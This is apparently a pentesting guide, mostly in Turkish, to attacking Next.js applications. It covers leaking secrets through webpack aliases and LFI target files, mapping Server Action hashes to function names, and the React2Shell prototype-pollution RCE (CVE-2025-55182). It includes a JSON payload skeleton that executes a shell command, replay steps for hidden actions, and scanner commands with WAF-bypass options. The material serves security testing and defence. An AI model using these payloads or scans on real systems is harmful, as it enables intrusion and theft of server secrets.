<summary>Webpack Configuration</summary>

Next.js uygulamanız için Webpack yapılandırmalarını özelleştirmek, dikkatli kullanılmazsa istemeden güvenlik açıklarına yol açabilir.

#### a. Hassas Modüllerin Açığa Çıkması

**Kötü Yapılandırma Örneği:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Sorun:**

- **Exposing Sensitive Paths:** Hassas dizinlerin aliasing yapılması ve istemci tarafı erişimine izin verilmesi gizli bilgilerin leak olmasına neden olabilir.
- **Bundling Secrets:** Eğer hassas dosyalar istemci için bundle'lanırsa, içerikleri source maps üzerinden veya istemci tarafı kodunu inceleyerek erişilebilir hale gelir.

**Saldırganlar bunu nasıl kötüye kullanır:**

Saldırganlar uygulamanın dizin yapısına erişebilir veya yeniden oluşturabilir; potansiyel olarak hassas dosyaları veya verileri bulup istismar edebilirler.

</details>

### `pages/_app.js` ve `pages/_document.js`

#### **`pages/_app.js`**

**Amaç:** Varsayılan App bileşeninin üzerine yazar; global state, stiller ve layout bileşenlerine izin verir.

**Kullanım Durumları:**

- Global CSS eklemek.
- Layout sarmalayıcıları eklemek.
- State yönetimi kütüphanelerini entegre etmek.

**Örnek:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Amaç:** Varsayılan Document'i geçersiz kılar, HTML ve Body etiketlerinin özelleştirilmesine olanak tanır.

**Kullanım Durumları:**

- `<html>` veya `<body>` etiketlerini değiştirmek.
- meta etiketleri veya özel scriptler eklemek.
- Üçüncü taraf yazı tiplerini entegre etmek.

**Örnek:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Custom Server (İsteğe Bağlı)

**Amaç:** Next.js yerleşik bir server ile gelirken, özel yönlendirme veya mevcut backend services ile entegrasyon gibi gelişmiş kullanım durumları için bir custom server oluşturabilirsiniz.

**Not:** Bir custom server kullanmak dağıtım seçeneklerini kısıtlayabilir, özellikle Next.js'in yerleşik server'ını optimize eden Vercel gibi platformlarda.

**Örnek:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Ek Mimari ve Güvenlik Hususları

### Ortam Değişkenleri ve Yapılandırma

**Amaç:** Hassas bilgileri ve yapılandırma ayarlarını kod tabanının dışında yönetin.

**En İyi Uygulamalar:**

- **Use `.env` Files:** API anahtarları gibi değişkenleri `.env.local` içinde saklayın (versiyon kontrolünden hariç tutulur).
- **Access Variables Securely:** Ortam değişkenlerine erişmek için `process.env.VARIABLE_NAME` kullanın.
- **Never Expose Secrets on the Client:** Hassas değişkenlerin yalnızca sunucu tarafında kullanıldığından emin olun.

**Örnek:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Not:** Değişkenleri sadece sunucu tarafına sınırlamak için, bunları `env` nesnesinden çıkarın veya istemciye açmak için `NEXT_PUBLIC_` ile önekleyin.

### LFI/download uç noktaları aracılığıyla hedeflenecek faydalı sunucu artifaktları

Bir Next.js uygulamasında path traversal veya download API'si bulursanız, sunucu tarafı sırlarını ve auth mantığını leak eden derlenmiş artifaktları hedefleyin:

- `.env` / `.env.local` oturum secret'leri ve sağlayıcı kimlik bilgileri için.
- `.next/routes-manifest.json` ve `.next/build-manifest.json` tam rota listesi için.
- `.next/server/pages/api/auth/[...nextauth].js` derlenmiş NextAuth yapılandırmasını geri almak için (genellikle `process.env` değerleri ayarlı olmadığında fallback parolalar içerir).
- `next.config.js` / `next.config.mjs` rewrites, redirects ve middleware yönlendirmelerini incelemek için.

### Kimlik Doğrulama ve Yetkilendirme

**Yaklaşım:**

- **Oturum Tabanlı Authentication:** Kullanıcı oturumlarını yönetmek için çerezleri kullanın.
- **Token Tabanlı Authentication:** Stateless kimlik doğrulama için JWT'leri uygulayın.
- **Üçüncü Taraf Providers:** `next-auth` gibi kütüphaneleri kullanarak OAuth sağlayıcıları (ör. Google, GitHub) ile entegre edin.

**Güvenlik Uygulamaları:**

- **Güvenli Çerezler:** `HttpOnly`, `Secure` ve `SameSite` özniteliklerini ayarlayın.
- **Parola Hashleme:** Parolaları saklamadan önce mutlaka hash'leyin.
- **Girdi Doğrulama:** Girdileri doğrulayarak ve temizleyerek injection saldırılarını önleyin.

**Örnek:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Performans Optimizasyonu

**Stratejiler:**

- **Görüntü Optimizasyonu:** Otomatik görüntü optimizasyonu için Next.js'in `next/image` bileşenini kullanın.
- **Kod Bölme:** Kodun bölünmesi ve ilk yükleme sürelerinin azaltılması için dynamic imports kullanın.
- **Önbellekleme:** API yanıtları ve statik varlıklar için önbellekleme stratejilerini uygulayın.
- **Tembel Yükleme:** Bileşenleri veya varlıkları yalnızca gerektiğinde yükleyin.

**Örnek:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

Modern Next.js, sunucuda çalışan ancak istemciden çağrılan “Server Actions” kullanır. Prodüksiyonda bu çağrılar opaktır: tüm POST'lar ortak bir endpoint'e düşer ve `Next-Action` header'ında gönderilen build'e özgü bir hash ile ayırt edilir. Örnek:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
`productionBrowserSourceMaps` etkinleştirildiğinde, minified JS chunks `createServerReference(...)` çağrıları içerir; bu çağrılar action hash ile orijinal fonksiyon adı arasındaki eşlemeyi (ilişkili source maps ile birlikte) geri kazanmak için yeterli yapıyı leak eder. Bu, `Next-Action` içinde gözlemlenen hash'leri `deleteUserAccount()` veya `exportFinancialData()` gibi somut hedeflere çevirmenizi sağlar.

### Çıkarma yaklaşımı (regex on minified JS + optional source maps)

İndirilen JS chunk'larında `createServerReference` arayın ve hash ile fonksiyon/kaynak sembolünü çıkarın. İki faydalı desen:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Grup 1: server action hash (40+ hex chars)
- Grup 2: sembol veya kaynak haritası mevcut olduğunda orijinal fonksiyona çözülebilen yol

If the script advertises a source map (trailer comment `//# sourceMappingURL=<...>.map`), fetch it and resolve the symbol/path to the original function name.

### Practical workflow

- Passive discovery while browsing: capture requests with `Next-Action` headers and JS chunk URLs.
- Fetch the referenced JS bundles and accompanying `*.map` files (when present).
- Run the regex above to build a hash↔name dictionary.
- Use the dictionary to target testing:
- İsim odaklı önceliklendirme (örn., `transferFunds`, `exportFinancialData`).
- Fonksiyon adına göre build'lar arasındaki kapsama alanını takip edin (hash'ler build'lar arasında döner).

### Exercising hidden actions (template-based request)

Proxy'de gözlemlenen geçerli bir POST'u şablon olarak alın ve başka bir keşfedilmiş action'ı hedeflemek için `Next-Action` değerini değiştirin:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Repeater'da yeniden oynatın ve aksi halde ulaşılamayan action'ların yetkilendirmesini, girdi doğrulamasını ve iş mantığını test edin.

### Burp otomasyonu

- NextjsServerActionAnalyzer (Burp extension) yukarıdakileri Burp içinde otomatikleştirir:
- Proxy geçmişini JS chunk'ları için tarar, `createServerReference(...)` girdilerini çıkarır ve mevcut olduğunda source map'leri çözümler.
- Arama yapılabilir bir hash↔function-name sözlüğü tutar ve fonksiyon adına göre build'ler arasında çoğaltmaları ortadan kaldırır.
- Geçerli bir template POST'u bulabilir ve hedef action'ın hash'i yerleştirilmiş hazır gönderilmeye uygun bir Repeater sekmesi açabilir.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notlar ve sınırlamalar

- `productionBrowserSourceMaps`'un production'da etkin olmasını gerektirir; böylece bundle/source map'lerden isimler geri kazanılabilir.
- Fonksiyon adı açıklanması tek başına bir zafiyet değildir; bunu keşfi yönlendirmek ve her action'ın yetkilendirmesini test etmek için kullanın.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router dağıtımları that expose Server Actions on `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** contain a critical server-side prototype pollution during **Flight** chunk deserialization. By crafting `$` references inside a Flight payload an attacker can pivot from polluted prototypes to arbitrary JavaScript execution and then to OS command execution inside the Node.js process.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Flight chunk'larındaki saldırı zinciri

1. **Prototype pollution primitive:** Set `"then": "$1:__proto__:then"` so that the resolver writes a `then` function on `Object.prototype`. Any plain object processed afterwards becomes a thenable, letting the attacker influence async control flow inside RSC internals.
2. **Rebinding to the global `Function` constructor:** Point `_response._formData.get` at `"$1:constructor:constructor"`. During resolution, `object.constructor` → `Object`, and `Object.constructor` → `Function`, so future calls to `_formData.get()` actually execute `Function(...)`.
3. **Code execution via `_prefix`:** Place JavaScript source in `_response._prefix`. When the polluted `_formData.get` is invoked, the framework evaluates `Function(_prefix)(...)`, so the injected JS can run `require('child_process').exec()` or any other Node primitive.

#### Payload skeleton
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### React Server Function maruziyetinin haritalanması

React Server Functions (RSF), 'use server'; yönergesini içeren fonksiyonlardır. Her form action, mutation veya fetch helper bu fonksiyonlardan birine bağlıysa, attacker-supplied payloads'ı deserialize eden bir RSC Flight endpoint'e dönüşür. Faydalı recon adımları, React2Shell değerlendirmelerinden türetilmiştir:

- **Statik envanter:** framework tarafından otomatik olarak exposed edilen RSF sayısını anlamak için 'use server'; yönergesini arayın.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router varsayılanları:** `create-next-app` varsayılan olarak App Router + `app/` dizinini etkinleştirir; bu da sessizce her route’u RSC-capable endpoint’e dönüştürür. `/_next/static/chunks/app/` gibi App Router varlıkları veya Flight chunk’larını `text/x-component` üzerinden streamleyen yanıtlar, güçlü Internet-facing parmak izleridir.
- **Dolaylı olarak savunmasız RSC dağıtımları:** React’in kendi advisory’si, RSC runtime gönderen uygulamaların **açık RSF’ler olmasa bile** sömürülebilir olabileceğini not eder; bu nedenle `react-server-dom-*` 19.0.0–19.2.0 kullanan her build’i şüpheli sayın.
- **RSC’yi paketleyen diğer frameworkler:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, vb. aynı serializer’ı yeniden kullanır ve düzeltilmiş React build’lerini embed edene kadar aynı uzak saldırı yüzeyini miras alır.

#### Sürüm kapsamı (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **vulnerable** 19.0.0, 19.1.0–19.1.1 ve 19.2.0 sürümlerinde; sırasıyla 19.0.1, 19.1.2 ve 19.2.1’de **patched**.
- **Next.js kararlı:** App Router sürümleri 15.0.0–16.0.6 vulnerable RSC yığını embed eder. Patch trenleri 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 sabitlenmiş bağımlılıklar içerir; bu sürümlerin altındaki herhangi bir build yüksek önceliklidir.
- **Next.js canary:** `14.3.0-canary.77+` da hatalı runtime’ı gönderir ve şu anda patched canary drop’ları eksik olduğundan, bu parmak izleri güçlü exploitable adaylardır.

#### Uzak tespit oracle’ı

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) crafted multipart Flight isteğini aday path’lere gönderir ve sunucu tarafı davranışı izler:

- **Default mode** deterministik bir RCE payload’u çalıştırır (matematiksel işlem `X-Action-Redirect` aracılığıyla yansıtılır) ve kod yürütmeyi kanıtlar.
- **`--safe-check` mode** kasıtlı olarak Flight mesajını bozar; böylece patched sunucular `200/400` dönerken, vulnerable hedefler gövde içinde `E{"digest"` alt dizisini içeren `HTTP/500` yanıtları üretir. Bu `(500 + digest)` ikilisi şu anda defender’lar tarafından yayımlanan en güvenilir uzak oracle’dır.
- Dahili `--waf-bypass`, `--vercel-waf-bypass` ve `--windows` switch’leri payload yerleşimini ayarlar, başına çöp ekler veya OS komutlarını değiştirir; böylece gerçek Internet varlıklarını probe edebilirsiniz.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
## Kaynaklar

- [Pentesting Next.js Server Actions — Hash-to-Function Mapping için bir Burp eklentisi](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp eklentisi)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – Bilmeniz Gereken Her Şey](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Önceki (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)

{{#include ../../banners/hacktricks-training.md}}
